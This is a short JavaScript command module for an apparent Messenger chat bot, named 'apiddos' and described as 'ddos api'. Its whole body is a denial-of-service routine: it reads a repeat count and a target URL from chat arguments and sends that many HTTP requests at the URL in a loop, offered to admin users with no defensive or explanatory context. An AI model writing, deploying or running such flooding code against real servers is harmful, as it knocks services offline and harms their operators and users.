module.exports.config = {
  name: "apiddos",
  version: "1.0.0",
  hasPermssion: 2,
  credits: "tdunguwu",
  description: "ddos api ;-;?",
  commandCategory: "admin",
  usages: "",
  cooldowns: 2,
  dependencies: {"axios" : ""}
};
module.exports.run = async({api, event, args}) => {
  const request = require('request')
  try{
var solan = args[0];
var api = args[1];
for ( i = 0; i < solan; i +=1){
  request(api);
  console.log(solan)
  //return api.sendMessage(`Well done`, event.threadID, event.messageID)
//console.log(solan);
//api.sendMessage(solan, event.threadID, event.messageID);
}
  } catch(e) {
  console.log(e)
  }
}